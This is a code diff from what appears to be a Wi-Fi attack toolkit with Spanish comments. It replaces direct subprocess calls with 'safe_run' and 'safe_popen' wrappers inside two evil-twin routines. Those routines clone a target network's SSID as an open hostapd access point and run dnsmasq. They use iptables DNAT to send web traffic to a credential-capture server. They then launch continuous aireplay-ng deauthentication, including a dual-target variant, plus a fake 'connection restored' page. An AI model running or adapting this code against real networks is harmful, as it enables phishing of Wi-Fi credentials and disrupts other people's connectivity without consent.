@@ -10,6 +10,7 @@ import subprocess
 import threading
 from dragonfly.config import BASE_DIR_EVIL, DIR_EVIL_PORTALS
 from dragonfly.core.process_manager import ProcessManager
+from dragonfly.core.subprocess_utils import safe_popen, safe_run
 from dragonfly.core.session import SessionManager
 
 
@@ -141,22 +142,22 @@ if __name__ == "__main__":
                     f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p>Ya puede cerrar esta ventana.</p></body></html>')
 
             # 3. Levantar Hostapd
-            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red_target['essid']}\nhw_mode=g\nchannel={int(red_target['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
             with open("/tmp/hostapd_evil.conf", "w") as f:
                 f.write(hostapd_conf)
 
-            proc_hostapd = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
+            proc_hostapd = safe_popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
                                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.pm.register("hostapd", proc_hostapd)
             time.sleep(3)
 
             # 4. Configurar IP en la interfaz AP
-            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
             time.sleep(1.5)
 
             # 5. Levantar Dnsmasq
@@ -164,37 +165,37 @@ if __name__ == "__main__":
             with open("/tmp/dnsmasq_evil.conf", "w") as f:
                 f.write(dnsmasq_conf)
 
-            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
-            proc_dnsmasq = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
+            safe_run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
+            proc_dnsmasq = safe_popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.pm.register("dnsmasq", proc_dnsmasq)
             time.sleep(2)
 
             # 6. Reglas Iptables
-            subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
             for port in ["80", "53"]:
-                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+                safe_run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
             for port in ["53", "67"]:
-                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+                safe_run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
 
             # 7. Servidor Web de Captura
-            proc_web = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
+            proc_web = safe_popen(["sudo", "python3", f"{tmp_web}/capture.py"],
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.pm.register("web_server", proc_web)
             time.sleep(1)
 
             # 8. Ataque deauth en la segunda tarjeta
-            subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", str(red_target['ch'])],
+            safe_run(["sudo", "iw", "dev", mon_deauth, "set", "channel", str(red_target['ch'])],
                            stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
             deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red_target['bssid']]
             if deauth_mode == "directed" and cliente_mac:
                 deauth_cmd.extend(["-c", cliente_mac])
             deauth_cmd.append(mon_deauth)
 
-            proc_deauth = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            proc_deauth = safe_popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.pm.register("deauth", proc_deauth)
 
             if on_output:
@@ -221,7 +222,7 @@ if __name__ == "__main__":
             self.pm.terminate_all()
             ProcessManager.flush_iptables(ap_iface)
             if mon_deauth:
-                subprocess.run(["sudo", "airmon-ng", "stop", mon_deauth], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                safe_run(["sudo", "airmon-ng", "stop", mon_deauth], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             ProcessManager.restart_network_manager()
 
             if on_output:
@@ -332,22 +333,22 @@ if __name__ == "__main__":
                     f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p>Ya puede cerrar esta ventana.</p></body></html>')
 
             # 3. Hostapd
-            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red_ap['essid']}\nhw_mode=g\nchannel={int(red_ap['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
             with open("/tmp/hostapd_evil.conf", "w") as f:
                 f.write(hostapd_conf)
 
-            proc_hostapd = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
+            proc_hostapd = safe_popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
                                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.pm.register("hostapd", proc_hostapd)
             time.sleep(3)
 
             # 4. Configurar IP
-            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
             time.sleep(1.5)
 
             # 5. Dnsmasq
@@ -355,31 +356,31 @@ if __name__ == "__main__":
             with open("/tmp/dnsmasq_evil.conf", "w") as f:
                 f.write(dnsmasq_conf)
 
-            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
-            proc_dnsmasq = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
+            safe_run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
+            proc_dnsmasq = safe_popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.pm.register("dnsmasq", proc_dnsmasq)
             time.sleep(2)
 
             # 6. Reglas Iptables
-            subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
+            safe_run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
             for port in ["80", "53"]:
-                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+                safe_run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
             for port in ["53", "67"]:
-                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+                safe_run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
 
             # 7. Servidor Web
-            proc_web = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
+            proc_web = safe_popen(["sudo", "python3", f"{tmp_web}/capture.py"],
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             self.pm.register("web_server", proc_web)
             time.sleep(1)
 
             # 8. Deauth Dual con MultiDeauthAttack
-            subprocess.run(["sudo", "iw", "dev", mon1, "set", "channel", str(target1['ch'])], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iw", "dev", mon2, "set", "channel", str(target2['ch'])], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+            safe_run(["sudo", "iw", "dev", mon1, "set", "channel", str(target1['ch'])], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+            safe_run(["sudo", "iw", "dev", mon2, "set", "channel", str(target2['ch'])], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
 
             self.multi_deauth = MultiDeauthAttack(
                 mon_ifaces=[mon1, mon2],
@@ -418,7 +419,7 @@ if __name__ == "__main__":
             ProcessManager.flush_iptables(ap_iface)
             for m in [mon1, mon2]:
                 if m:
-                    subprocess.run(["sudo", "airmon-ng", "stop", m], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    safe_run(["sudo", "airmon-ng", "stop", m], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             ProcessManager.restart_network_manager()
 
             if on_output:
